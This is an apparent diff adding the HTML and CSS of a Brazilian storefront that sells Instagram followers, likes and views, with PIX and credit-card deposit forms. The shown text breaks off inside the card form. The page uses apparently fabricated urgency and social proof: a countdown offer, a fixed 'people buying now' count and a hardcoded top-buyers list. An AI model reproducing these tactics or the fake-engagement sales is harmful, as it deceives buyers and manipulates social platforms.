@@ -1,0 +1,2223 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Wendizx Elite Store - Premium Edition</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+	--p: #00f2fe;
+	--s: #4facfe;
+	--a: #00ff88;
+	--d: #ff4b2b;
+	--bg: #030005;
+	--g: rgba(255,255,255,0.03);
+	--glass: rgba(10,10,10,0.85);
+	--glass-border: rgba(255,255,255,0.08);
+	--card-hover: rgba(255,255,255,0.05);
+	--shadow-sm: 0 4px 16px rgba(0,0,0,0.3);
+	--shadow-md: 0 8px 32px rgba(0,0,0,0.4);
+	--shadow-lg: 0 16px 48px rgba(0,0,0,0.5);
+	--glow-cyan: 0 0 20px rgba(0,242,254,0.15);
+	--glow-green: 0 0 20px rgba(0,255,136,0.15);
+}
+
+* {
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+	font-family: 'Inter', sans-serif;
+	-webkit-tap-highlight-color: transparent;
+}
+
+body {
+	height: 100vh;
+	overflow: hidden;
+	background: var(--bg);
+	color: #fff;
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	position: relative;
+}
+
+/* Particles Background */
+#particles {
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	z-index: 1;
+	pointer-events: none;
+	opacity: 0.4;
+}
+
+/* Scanline Effect */
+.scanline {
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	background: linear-gradient(
+		to bottom,
+		transparent 50%,
+		rgba(0,242,254,0.02) 50%
+	);
+	background-size: 100% 4px;
+	z-index: 2;
+	pointer-events: none;
+	animation: scan 8s linear infinite;
+}
+
+@keyframes scan {
+	0% { transform: translateY(0); }
+	100% { transform: translateY(4px); }
+}
+
+/* Main App Container */
+.app {
+	position: relative;
+	z-index: 100;
+	width: 95%;
+	max-width: 420px;
+	height: 94vh;
+	background: var(--glass);
+	backdrop-filter: blur(60px) saturate(180%);
+	-webkit-backdrop-filter: blur(60px) saturate(180%);
+	border-radius: 48px;
+	border: 1px solid var(--glass-border);
+	display: flex;
+	flex-direction: column;
+	overflow: hidden;
+	box-shadow: var(--shadow-lg), var(--glow-cyan);
+	transition: transform 0.3s ease;
+}
+
+/* Status Bar */
+.status-bar {
+	position: absolute;
+	top: 16px;
+	width: 100%;
+	padding: 0 32px;
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	font-size: 10px;
+	color: #666;
+	font-weight: 800;
+	letter-spacing: 1.5px;
+	z-index: 200;
+}
+
+.status-left {
+	display: flex;
+	align-items: center;
+	gap: 8px;
+}
+
+.status-right {
+	display: flex;
+	align-items: center;
+	gap: 12px;
+}
+
+.theme-toggle {
+	cursor: pointer;
+	font-size: 16px;
+	transition: transform 0.2s ease;
+}
+
+.theme-toggle:hover {
+	transform: scale(1.1);
+}
+
+.notif-bell {
+	position: relative;
+	cursor: pointer;
+	font-size: 16px;
+	transition: transform 0.2s ease;
+}
+
+.notif-bell:hover {
+	transform: scale(1.1);
+}
+
+.notif-count {
+	position: absolute;
+	top: -6px;
+	right: -8px;
+	background: var(--d);
+	color: #fff;
+	font-size: 9px;
+	padding: 2px 5px;
+	border-radius: 10px;
+	font-weight: 900;
+	min-width: 16px;
+	text-align: center;
+	box-shadow: 0 2px 8px rgba(255,75,43,0.4);
+}
+
+/* Header Section */
+.header {
+	padding: 48px 28px 16px;
+	text-align: center;
+}
+
+.logo-container {
+	width: 92px;
+	height: 92px;
+	margin: 0 auto 14px;
+	border-radius: 50%;
+	border: 2.5px solid var(--p);
+	overflow: hidden;
+	background: #000;
+	box-shadow: var(--glow-cyan), var(--shadow-md);
+	transition: all 0.3s ease;
+	position: relative;
+}
+
+.logo-container::after {
+	content: '';
+	position: absolute;
+	inset: -2px;
+	background: conic-gradient(from 0deg, transparent, var(--p), transparent);
+	border-radius: 50%;
+	animation: rotate 3s linear infinite;
+	z-index: -1;
+	opacity: 0;
+	transition: opacity 0.3s ease;
+}
+
+.logo-container:hover::after {
+	opacity: 1;
+}
+
+@keyframes rotate {
+	to { transform: rotate(360deg); }
+}
+
+.logo-container img {
+	width: 100%;
+	height: 100%;
+	object-fit: cover;
+}
+
+.logo {
+	font-family: 'Syncopate', sans-serif;
+	font-size: 20px;
+	letter-spacing: 6px;
+	cursor: pointer;
+	text-transform: uppercase;
+	font-weight: 700;
+	background: linear-gradient(135deg, #fff 0%, var(--p) 100%);
+	-webkit-background-clip: text;
+	-webkit-text-fill-color: transparent;
+	background-clip: text;
+	transition: all 0.3s ease;
+}
+
+.logo:hover {
+	letter-spacing: 8px;
+}
+
+/* Promo Timer */
+.promo-timer {
+	background: linear-gradient(135deg, rgba(255,75,43,0.1) 0%, rgba(255,75,43,0.05) 100%);
+	border: 1px solid rgba(255,75,43,0.3);
+	padding: 12px 20px;
+	border-radius: 20px;
+	margin: 12px 0;
+	font-size: 11px;
+	text-align: center;
+	font-weight: 700;
+	letter-spacing: 1px;
+	box-shadow: 0 4px 12px rgba(255,75,43,0.1);
+}
+
+.promo-timer b {
+	color: var(--d);
+	font-size: 13px;
+	margin-left: 4px;
+	font-family: 'Syncopate', sans-serif;
+}
+
+/* Balance Card */
+.balance-card {
+	background: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, rgba(255,255,255,0.03) 100%);
+	padding: 28px 24px;
+	border-radius: 32px;
+	margin-top: 12px;
+	border: 1px solid var(--glass-border);
+	position: relative;
+	overflow: hidden;
+	box-shadow: var(--shadow-sm);
+	transition: all 0.3s ease;
+}
+
+.balance-card:hover {
+	transform: translateY(-2px);
+	box-shadow: var(--shadow-md);
+	border-color: rgba(0,242,254,0.2);
+}
+
+.balance-card::before {
+	content: '';
+	position: absolute;
+	top: 0;
+	left: -100%;
+	width: 100%;
+	height: 100%;
+	background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+	animation: shimmer 3s infinite;
+}
+
+@keyframes shimmer {
+	to { left: 100%; }
+}
+
+.balance-label {
+	font-size: 9px;
+	color: #666;
+	letter-spacing: 3px;
+	font-weight: 800;
+	margin-bottom: 8px;
+}
+
+.saldo-row {
+	display: flex;
+	align-items: center;
+	justify-content: space-between;
+	gap: 16px;
+}
+
+.saldo-text {
+	font-size: 40px;
+	font-weight: 900;
+	color: var(--a);
+	font-family: 'Syncopate', sans-serif;
+	text-shadow: var(--glow-green);
+	letter-spacing: 2px;
+}
+
+/* Tabs */
+.tabs {
+	display: flex;
+	background: rgba(0,0,0,0.7);
+	padding: 6px;
+	margin: 14px 24px;
+	border-radius: 28px;
+	border: 1px solid rgba(255,255,255,0.05);
+	box-shadow: var(--shadow-sm);
+}
+
+.tab {
+	flex: 1;
+	text-align: center;
+	padding: 14px 8px;
+	font-size: 10px;
+	font-weight: 900;
+	color: #555;
+	cursor: pointer;
+	border-radius: 22px;
+	transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+	text-transform: uppercase;
+	letter-spacing: 1.2px;
+	position: relative;
+}
+
+.tab::after {
+	content: '';
+	position: absolute;
+	bottom: 4px;
+	left: 50%;
+	transform: translateX(-50%);
+	width: 0;
+	height: 2px;
+	background: var(--p);
+	transition: width 0.3s ease;
+}
+
+.tab.active {
+	color: #fff;
+	background: linear-gradient(135deg, rgba(0,242,254,0.15) 0%, rgba(79,172,254,0.1) 100%);
+	box-shadow: 0 4px 12px rgba(0,242,254,0.1);
+}
+
+.tab.active::after {
+	width: 60%;
+}
+
+.tab:hover:not(.active) {
+	color: #888;
+	background: rgba(255,255,255,0.02);
+}
+
+/* Views */
+.view {
+	display: none;
+	flex-direction: column;
+	padding: 8px 24px 16px;
+	overflow-y: auto;
+	flex: 1;
+	scrollbar-width: thin;
+	scrollbar-color: var(--p) transparent;
+}
+
+.view::-webkit-scrollbar {
+	width: 6px;
+}
+
+.view::-webkit-scrollbar-track {
+	background: transparent;
+}
+
+.view::-webkit-scrollbar-thumb {
+	background: var(--p);
+	border-radius: 10px;
+}
+
+.view.active {
+	display: flex;
+	animation: fadeSlideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+@keyframes fadeSlideIn {
+	from {
+		opacity: 0;
+		transform: translateY(20px);
+	}
+	to {
+		opacity: 1;
+		transform: translateY(0);
+	}
+}
+
+/* Live Count */
+.live-count {
+	color: var(--a);
+	font-size: 11px;
+	text-align: center;
+	margin-bottom: 14px;
+	font-weight: 800;
+	letter-spacing: 1px;
+	padding: 10px;
+	background: linear-gradient(135deg, rgba(0,255,136,0.08) 0%, rgba(0,255,136,0.02) 100%);
+	border-radius: 16px;
+	border: 1px solid rgba(0,255,136,0.1);
+	animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+	0%, 100% { opacity: 1; }
+	50% { opacity: 0.8; }
+}
+
+/* Cards */
+.card {
+	background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%);
+	border: 1px solid var(--glass-border);
+	padding: 24px 22px;
+	border-radius: 28px;
+	margin-bottom: 12px;
+	cursor: pointer;
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+	position: relative;
+	overflow: hidden;
+}
+
+.card::before {
+	content: '';
+	position: absolute;
+	inset: 0;
+	background: linear-gradient(135deg, rgba(0,242,254,0.1) 0%, transparent 100%);
+	opacity: 0;
+	transition: opacity 0.3s ease;
+}
+
+.card:hover {
+	transform: translateY(-4px) scale(1.02);
+	background: var(--card-hover);
+	border-color: rgba(0,242,254,0.3);
+	box-shadow: var(--shadow-md), var(--glow-cyan);
+}
+
+.card:hover::before {
+	opacity: 1;
+}
+
+.card:active {
+	transform: translateY(-2px) scale(1);
+}
+
+.card b {
+	font-weight: 800;
+	font-size: 13px;
+	letter-spacing: 0.5px;
+}
+
+.card small {
+	color: #777;
+	font-size: 11px;
+	margin-top: 4px;
+	display: block;
+}
+
+.card span {
+	font-size: 20px;
+	opacity: 0.6;
+	transition: all 0.3s ease;
+}
+
+.card:hover span {
+	opacity: 1;
+	transform: translateX(4px);
+}
+
+/* Buttons */
+.btn {
+	width: 100%;
+	padding: 20px;
+	border-radius: 24px;
+	border: none;
+	font-weight: 900;
+	text-transform: uppercase;
+	cursor: pointer;
+	background: linear-gradient(135deg, var(--p) 0%, var(--s) 100%);
+	color: #000;
+	transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+	font-size: 13px;
+	letter-spacing: 1.5px;
+	box-shadow: 0 8px 24px rgba(0,242,254,0.3);
+	position: relative;
+	overflow: hidden;
+}
+
+.btn::before {
+	content: '';
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	width: 0;
+	height: 0;
+	background: rgba(255,255,255,0.3);
+	border-radius: 50%;
+	transform: translate(-50%, -50%);
+	transition: width 0.6s, height 0.6s;
+}
+
+.btn:hover::before {
+	width: 300px;
+	height: 300px;
+}
+
+.btn:hover {
+	transform: translateY(-2px);
+	box-shadow: 0 12px 32px rgba(0,242,254,0.4);
+}
+
+.btn:active {
+	transform: scale(0.98);
+}
+
+.btn.loading {
+	opacity: 0.7;
+	pointer-events: none;
+	position: relative;
+}
+
+.btn.loading::after {
+	content: '';
+	position: absolute;
+	right: 18px;
+	top: 50%;
+	transform: translateY(-50%);
+	width: 16px;
+	height: 16px;
+	border: 2.5px solid rgba(0,0,0,0.2);
+	border-top-color: rgba(0,0,0,0.7);
+	border-radius: 50%;
+	animation: spin 0.6s linear infinite;
+}
+
+@keyframes spin {
+	to { transform: translateY(-50%) rotate(360deg); }
+}
+
+.btn-sec {
+	background: transparent;
+	border: 1.5px solid rgba(255,255,255,0.15);
+	color: #999;
+	margin-top: 12px;
+	box-shadow: none;
+}
+
+.btn-sec:hover {
+	border-color: rgba(255,255,255,0.3);
+	color: #fff;
+	background: rgba(255,255,255,0.03);
+}
+
+.btn.small {
+	padding: 10px 16px;
+	font-size: 11px;
+	border-radius: 16px;
+	width: auto;
+	letter-spacing: 1px;
+}
+
+/* Inputs */
+input, select {
+	width: 100%;
+	padding: 20px 18px;
+	margin: 8px 0;
+	border-radius: 24px;
+	border: 1.5px solid var(--glass-border);
+	background: rgba(0,0,0,0.6);
+	color: #fff;
+	text-align: center;
+	font-weight: 700;
+	font-size: 14px;
+	transition: all 0.3s ease;
+	letter-spacing: 0.5px;
+}
+
+input:focus, select:focus {
+	border-color: var(--p);
+	outline: none;
+	background: rgba(0,0,0,0.7);
+	box-shadow: 0 0 0 4px rgba(0,242,254,0.1);
+}
+
+input::placeholder {
+	color: #555;
+	font-weight: 600;
+}
+
+/* Modal */
+.modal {
+	position: fixed;
+	inset: 0;
+	background: rgba(0,0,0,0.96);
+	z-index: 9999;
+	display: none;
+	align-items: center;
+	justify-content: center;
+	backdrop-filter: blur(30px);
+	animation: modalFadeIn 0.3s ease;
+}
+
+@keyframes modalFadeIn {
+	from {
+		opacity: 0;
+	}
+	to {
+		opacity: 1;
+	}
+}
+
+.modal-content {
+	width: 90%;
+	max-width: 400px;
+	background: linear-gradient(135deg, #0a0a0a 0%, #050505 100%);
+	border: 1.5px solid var(--p);
+	padding: 44px 32px;
+	border-radius: 48px;
+	text-align: center;
+	box-shadow: var(--shadow-lg), var(--glow-cyan);
+	animation: modalSlideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+@keyframes modalSlideIn {
+	from {
+		transform: translateY(40px) scale(0.9);
+		opacity: 0;
+	}
+	to {
+		transform: translateY(0) scale(1);
+		opacity: 1;
+	}
+}
+
+/* Ranking */
+.ranking-container {
+	background: linear-gradient(135deg, rgba(0,242,254,0.05) 0%, rgba(79,172,254,0.02) 100%);
+	border-radius: 24px;
+	padding: 20px;
+	margin-top: 16px;
+	border: 1px solid rgba(0,242,254,0.1);
+	box-shadow: var(--shadow-sm);
+}
+
+.ranking-title {
+	font-size: 10px;
+	color: var(--p);
+	margin-bottom: 14px;
+	font-weight: 800;
+	letter-spacing: 2px;
+}
+
+.rank-item {
+	display: flex;
+	justify-content: space-between;
+	font-size: 12px;
+	padding: 10px 0;
+	opacity: 0.9;
+	border-bottom: 1px solid rgba(255,255,255,0.03);
+	transition: all 0.2s ease;
+}
+
+.rank-item:last-child {
+	border-bottom: none;
+}
+
+.rank-item:hover {
+	opacity: 1;
+	padding-left: 8px;
+}
+
+/* Activity Feed */
+.activity-feed {
+	margin-top: 16px;
+	max-height: 240px;
+	overflow: auto;
+	border-radius: 20px;
+	border: 1px solid rgba(255,255,255,0.05);
+	padding: 10px;
+	background: rgba(0,0,0,0.3);
+	scrollbar-width: thin;
+	scrollbar-color: var(--p) transparent;
+}
+
+.act-item {
+	display: flex;
+	justify-content: space-between;
+	gap: 14px;
+	padding: 12px;
+	border-bottom: 1px solid rgba(255,255,255,0.03);
+	font-size: 12px;
+	align-items: center;
+	transition: all 0.2s ease;
+	border-radius: 12px;
+	cursor: pointer;
+}
+
+.act-item:hover {
+	background: rgba(255,255,255,0.03);
+	transform: translateX(4px);
+}
+
+.act-avatar {
+	width: 40px;
+	height: 40px;
+	border-radius: 50%;
+	background: linear-gradient(135deg, var(--p), var(--s));
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	font-weight: 900;
+	font-size: 16px;
+	flex-shrink: 0;
+	box-shadow: var(--glow-cyan);
+}
+
+.act-meta {
+	color: #777;
+	font-size: 10px;
+	margin-top: 4px;
+	letter-spacing: 0.5px;
+}
+
+.act-type {
+	font-weight: 900;
+	font-size: 11px;
+	color: var(--p);
+	display: block;
+	letter-spacing: 1px;
+}
+
+/* Badges */
+.badge {
+	padding: 6px 10px;
+	border-radius: 14px;
+	font-size: 10px;
+	font-weight: 800;
+	letter-spacing: 0.5px;
+	display: inline-block;
+}
+
+.badge.deposit {
+	background: rgba(0,255,136,0.12);
+	color: var(--a);
+	border: 1px solid rgba(0,255,136,0.2);
+}
+
+.badge.purchase {
+	background: rgba(0,242,254,0.12);
+	color: var(--p);
+	border: 1px solid rgba(0,242,254,0.2);
+}
+
+.badge.pending {
+	background: rgba(255,165,0,0.12);
+	color: #ffae00;
+	border: 1px solid rgba(255,165,0,0.2);
+}
+
+/* Toast */
+.toast {
+	position: fixed;
+	bottom: 24px;
+	left: 50%;
+	transform: translateX(-50%);
+	background: linear-gradient(135deg, var(--p) 0%, var(--s) 100%);
+	color: #000;
+	padding: 14px 28px;
+	border-radius: 24px;
+	font-weight: 800;
+	font-size: 13px;
+	z-index: 10000;
+	box-shadow: var(--shadow-md), var(--glow-cyan);
+	animation: toastIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+	letter-spacing: 0.5px;
+}
+
+@keyframes toastIn {
+	from {
+		opacity: 0;
+		transform: translate(-50%, 20px);
+	}
+	to {
+		opacity: 1;
+		transform: translate(-50%, 0);
+	}
+}
+
+/* WhatsApp & Instagram FABs */
+.whatsapp-fab, .instagram-fab {
+	position: fixed;
+	bottom: 24px;
+	width: 64px;
+	height: 64px;
+	border-radius: 50%;
+	box-shadow: var(--shadow-md);
+	z-index: 20000;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	cursor: pointer;
+	transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+	overflow: hidden;
+}
+
+.whatsapp-fab {
+	right: 24px;
+}
+
+.instagram-fab {
+	right: 100px;
+	width: 56px;
+	height: 56px;
+}
+
+.whatsapp-fab:hover, .instagram-fab:hover {
+	transform: translateY(-8px) scale(1.05);
+	box-shadow: var(--shadow-lg);
+}
+
+.whatsapp-fab img, .instagram-fab img {
+	width: 100%;
+	height: 100%;
+	object-fit: cover;
+}
+
+/* Chart Canvas */
+#chartCanvas {
+	width: 100%;
+	height: 50px;
+	margin-top: 14px;
+	border-bottom: 1.5px solid rgba(0,242,254,0.3);
+	border-radius: 8px;
+}
+
+/* Deposit Banner */
+.deposit-banner {
+	position: fixed;
+	top: 100px;
+	right: -420px;
+	width: 380px;
+	background: linear-gradient(135deg, #00ff88 0%, #00f2fe 100%);
+	color: #001;
+	padding: 18px 22px;
+	border-radius: 24px;
+	box-shadow: var(--shadow-lg);
+	font-weight: 900;
+	z-index: 20000;
+	transition: right 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+	display: flex;
+	gap: 12px;
+	align-items: center;
+}
+
+.deposit-banner.show {
+	right: 24px;
+}
+
+.deposit-banner.hide {
+	right: -440px;
+}
+
+/* Processing */
+.processing-wrap {
+	display: flex;
+	flex-direction: column;
+	gap: 16px;
+	align-items: center;
+}
+
+.progress-bar {
+	width: 85%;
+	height: 12px;
+	background: rgba(255,255,255,0.08);
+	border-radius: 20px;
+	overflow: hidden;
+}
+
+.progress-bar .fill {
+	height: 100%;
+	width: 0%;
+	background: linear-gradient(90deg, var(--a), var(--p));
+	transition: width 1.4s cubic-bezier(0.4, 0, 0.2, 1);
+	box-shadow: var(--glow-cyan);
+}
+
+.success-card {
+	display: flex;
+	gap: 14px;
+	align-items: center;
+	justify-content: space-between;
+	background: linear-gradient(135deg, #00ff88 0%, #00f2fe 100%);
+	color: #022;
+	padding: 20px;
+	border-radius: 20px;
+	font-weight: 900;
+	box-shadow: var(--shadow-md), var(--glow-green);
+}
+
+.order-id {
+	font-family: 'Syncopate', sans-serif;
+	font-size: 18px;
+	color: #002;
+	letter-spacing: 2px;
+}
+
+/* Skeleton Loader */
+.skeleton {
+	background: linear-gradient(90deg, #111 25%, #1a1a1a 37%, #111 63%);
+	background-size: 400% 100%;
+	animation: skeletonShimmer 1.4s ease-in-out infinite;
+	height: 60px;
+	border-radius: 16px;
+	margin-bottom: 10px;
+}
+
+@keyframes skeletonShimmer {
+	0% { background-position: 100% 0; }
+	100% { background-position: -100% 0; }
+}
+
+/* Notification Panel */
+#notifPanel {
+	position: fixed;
+	right: 24px;
+	top: 80px;
+	width: 340px;
+	max-height: 65vh;
+	background: var(--glass);
+	backdrop-filter: blur(60px);
+	border: 1px solid var(--glass-border);
+	border-radius: 28px;
+	padding: 20px;
+	box-shadow: var(--shadow-lg), var(--glow-cyan);
+	overflow-y: auto;
+	z-index: 21000;
+	animation: slideInRight 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+	scrollbar-width: thin;
+	scrollbar-color: var(--p) transparent;
+}
+
+@keyframes slideInRight {
+	from {
+		opacity: 0;
+		transform: translateX(40px);
+	}
+	to {
+		opacity: 1;
+		transform: translateX(0);
+	}
+}
+
+#notifPanel .notif-header {
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	margin-bottom: 16px;
+	padding-bottom: 12px;
+	border-bottom: 1px solid rgba(255,255,255,0.1);
+}
+
+#notifPanel .notif-title {
+	font-weight: 900;
+	font-size: 14px;
+	letter-spacing: 1.5px;
+	color: var(--p);
+}
+
+#notifPanel .notif-close {
+	cursor: pointer;
+	font-size: 20px;
+	opacity: 0.6;
+	transition: opacity 0.2s;
+}
+
+#notifPanel .notif-close:hover {
+	opacity: 1;
+}
+
+#notifPanel .notif-item {
+	background: rgba(255,255,255,0.03);
+	padding: 14px;
+	border-radius: 16px;
+	margin-bottom: 10px;
+	border: 1px solid rgba(255,255,255,0.05);
+	transition: all 0.2s ease;
+	cursor: pointer;
+}
+
+#notifPanel .notif-item:hover {
+	background: rgba(255,255,255,0.06);
+	transform: translateX(4px);
+}
+
+#notifPanel .notif-item-title {
+	font-weight: 800;
+	font-size: 12px;
+	margin-bottom: 4px;
+	color: var(--a);
+}
+
+#notifPanel .notif-item-desc {
+	font-size: 11px;
+	color: #999;
+	line-height: 1.4;
+}
+
+#notifPanel .notif-item-time {
+	font-size: 10px;
+	color: #666;
+	margin-top: 6px;
+}
+
+/* Hidden Class */
+.hidden {
+	display: none !important;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+	.app {
+		width: 98%;
+		height: 96vh;
+		border-radius: 32px;
+	}
+	
+	.saldo-text {
+		font-size: 32px;
+	}
+	
+	.logo {
+		font-size: 16px;
+		letter-spacing: 4px;
+	}
+	
+	#notifPanel {
+		width: calc(100% - 48px);
+		right: 24px;
+	}
+	
+	.deposit-banner {
+		width: calc(100% - 48px);
+		font-size: 13px;
+	}
+}
+</style>
+</head>
+<body>
+
+<div class="scanline"></div>
+<canvas id="particles"></canvas>
+
+<div class="app">
+	<div class="status-bar">
+		<div class="status-left">
+			<span style="opacity: 0.9">WENDIZX NETWORK</span>
+		</div>
+		<div class="status-right">
+			<div class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Alternar tema">🌗</div>
+			<div id="notifBell" class="notif-bell" title="Notificações">
+				🔔
+				<span id="notifCount" class="notif-count hidden">0</span>
+			</div>
+			<span id="clock">12:00</span>
+		</div>
+	</div>
+
+	<div class="header">
+		<div class="logo-container">
+			<img src="https://i.postimg.cc/BbffRLkM/IMG-20251212-052129-915.webp" alt="Logo">
+		</div>
+		<div class="logo" onclick="secret()">WENDIZX <span style="color: var(--p)">STORE</span></div>
+		<div class="promo-timer">
+			OFERTA TERMINA EM: <b id="cd">02:00:00</b>
+		</div>
+		<div class="balance-card">
+			<p class="balance-label">CARTEIRA DIGITAL</p>
+			<div class="saldo-row">
+				<p class="saldo-text">
+					R$ <span id="meuSaldo">0,00</span>
+				</p>
+				<button class="btn small" onclick="goTo('view-deposito')">
+					ADICIONAR
+				</button>
+			</div>
+		</div>
+	</div>
+
+	<div class="tabs">
+		<div class="tab active" id="tab-serv" onclick="goTo('view-menu')">LOJA</div>
+		<div class="tab" id="tab-comb" onclick="goTo('view-combos')">PACKS</div>
+		<div class="tab" id="tab-hist" onclick="goTo('view-hist')">HISTÓRICO</div>
+	</div>
+
+	<div class="view active" id="view-menu">
+		<div class="live-count">🔥 <span id="user-now">12</span> PESSOAS COMPRANDO AGORA</div>
+		<div class="card" onclick="startBuy('Seguidores')">
+			<div>
+				<b>SEGUIDORES INSTAGRAM</b>
+				<small>R$ 0,011 p/ unidade</small>
+			</div>
+			<span>➔</span>
+		</div>
+		<div class="card" onclick="startBuy('Curtidas')">
+			<div>
+				<b>CURTIDAS REAIS</b>
+				<small>R$ 0,00299 p/ unidade</small>
+			</div>
+			<span>➔</span>
+		</div>
+		<div class="card" onclick="startBuy('Visualizações')">
+			<div>
+				<b>VIEWS STORYS/REELS</b>
+				<small>R$ 0,005 p/ unidade</small>
+			</div>
+			<span>➔</span>
+		</div>
+		<canvas id="chartCanvas"></canvas>
+	</div>
+
+	<div class="view" id="view-comprar">
+		<h2 id="buyTitle" style="color:var(--p); font-family:'Syncopate'; font-size:14px; margin-bottom:24px; letter-spacing: 2px;"></h2>
+		<input type="number" id="qtd" placeholder="QUANTIDADE">
+		<select id="regiao" onchange="calc()">
+			<option value="global">PERFIS MUNDIAIS</option>
+			<option value="br">PERFIS BRASILEIROS</option>
+		</select>
+		<input id="link" placeholder="LINK OU @USUARIO">
+		<div style="margin:24px 0; padding:28px; background:rgba(0,0,0,0.5); border-radius:32px; border: 1px solid rgba(255,255,255,0.08); text-align:center; box-shadow: var(--shadow-sm);">
+			<p style="font-size:10px; color:#666; letter-spacing: 2px; font-weight: 800;">INVESTIMENTO</p>
+			<h2 id="total" style="color:var(--a); font-size:42px; font-weight:900; margin-top: 8px; font-family: 'Syncopate';">R$ 0,00</h2>
+		</div>
+		<button id="btnOrderNow" class="btn" onclick="orderNow()">CONFIRMAR PEDIDO</button>
+		<button class="btn btn-sec" onclick="goTo('view-menu')">VOLTAR</button>
+	</div>
+
+	<div class="view" id="view-combos">
+		<h2 style="font-family:'Syncopate'; font-size:14px; margin-bottom:24px; color:var(--p); letter-spacing: 2px;">COMBOS EXCLUSIVOS</h2>
+		<div class="card" onclick="openCombo('Pack Start', 9.90)">
+			<div>
+				<b>PACK START 🚀</b>
+				<small>500 Seg + 150 Curtidas + 1k Views</small>
+			</div>
+			<b style="color:var(--a)">R$ 9,90</b>
+		</div>
+		<div class="card" onclick="openCombo('Influencer Pro 👑', 19.90)">
+			<div>
+				<b>INFLUENCER PRO</b>
+				<small>2k Seg + 500 Curtidas + 5k Views</small>
+			</div>
+			<b style="color:var(--a)">R$ 19,90</b>
+		</div>
+		<div class="ranking-container">
+			<p class="ranking-title">TOP COMPRADORES (DIA)</p>
+			<div class="rank-item"><span>1. @gabriel***</span> <b>R$ 442,00</b></div>
+			<div class="rank-item"><span>2. @isabella***</span> <b>R$ 310,50</b></div>
+			<div class="rank-item"><span>3. @felipe***</span> <b>R$ 128,00</b></div>
+		</div>
+		<div id="comboAction" class="hidden" style="margin-top:16px; background:rgba(0,0,0,0.6); padding:24px; border-radius:28px; border:1px solid var(--p); box-shadow: var(--shadow-sm);">
+			<p id="comboSelected" style="font-size:12px; margin-bottom:16px; font-weight:800;"></p>
+			<input id="linkCombo" placeholder="LINK DO PERFIL">
+			<button id="btnFinalizeCombo" class="btn" onclick="finalizarCombo()">ATIVAR AGORA</button>
+		</div>
+		<button class="btn btn-sec" style="margin-top:14px;" onclick="goTo('view-menu')">VOLTAR</button>
+	</div>
+
+	<div class="view" id="view-hist">
+		<h2 style="font-family:'Syncopate'; font-size:14px; margin-bottom:20px; letter-spacing: 2px;">HISTÓRICO</h2>
+		<div style="display:flex; gap:10px; align-items:center; margin-bottom:14px;">
+			<input id="feedSearch" placeholder="🔍 Buscar" style="flex:1; padding:12px 16px; border-radius:18px; background:rgba(0,0,0,0.6); border:1px solid rgba(255,255,255,0.06); color:#fff; font-size: 13px;" oninput="filterFeed()">
+			<select id="feedFilter" onchange="filterFeed()" style="padding:12px 16px; border-radius:18px; background:rgba(0,0,0,0.6); border:1px solid rgba(255,255,255,0.06); color:#fff; font-size: 12px;">
+				<option value="all">Todos</option>
+				<option value="deposit">Depósitos</option>
+				<option value="purchase">Compras</option>
+				<option value="pix_created">PIX</option>
+			</select>
+		</div>
+		<div id="hist-list"></div>
+		<div style="margin-top:16px;">
+			<p style="font-size:10px; color:var(--p); margin-bottom:10px; font-weight:800; letter-spacing: 2px;">FEED DE ATIVIDADES</p>
+			<div id="activity-feed" class="activity-feed"></div>
+		</div>
+		<button class="btn btn-sec" style="margin-top: 14px;" onclick="goTo('view-menu')">VOLTAR</button>
+	</div>
+
+	<div class="view" id="view-deposito">
+		<h2 style="font-family:'Syncopate'; font-size:14px; margin-bottom:24px; letter-spacing: 2px;">RECARREGAR</h2>
+		
+		<div id="metodo-selecao">
+			<p style="font-size:12px; color:#888; margin-bottom:18px; text-align:center; letter-spacing: 1px;">ESCOLHA O MÉTODO DE PAGAMENTO</p>
+			<div class="card" onclick="setMetodo('pix')" style="margin-bottom:12px;">
+				<div>
+					<b>PIX INSTANTÂNEO</b>
+					<small style="color:var(--a)">Aprovação imediata</small>
+				</div>
+				<span>⚡</span>
+			</div>
+			<div class="card" onclick="setMetodo('cartao')">
+				<div>
+					<b>CARTÃO DE CRÉDITO</b>
+					<small style="color:#90EE90">Aprovação imediata</small>
+				</div>
+				<span>💳</span>
+			</div>
+		</div>
+
+		<div id="fluxo-pix" class="hidden">
+			<input type="number" id="vDep" placeholder="VALOR R$">
+			<button id="btnPayPix" class="btn" onclick="payPix()">GERAR QR CODE</button>
+			<button class="btn btn-sec" onclick="setMetodo('reset')">VOLTAR</button>
+		</div>
+
+		<div id="fluxo-cartao" class="hidden">
+			<input type="number" id="vDepCartao" placeholder="VALOR DA RECARGA">
+			<input type="text" id="cc_nome" placeholder="NOME IMPRESSO NO CARTÃO">
+			<input type="text" id="cc_num" placeholder="0000 0000 0000 0000" maxlength="19">
+			<div style="display:flex; gap:12px;">
+				<input type="text" id="cc_val" placeholder="MM/AA" maxlength="5">
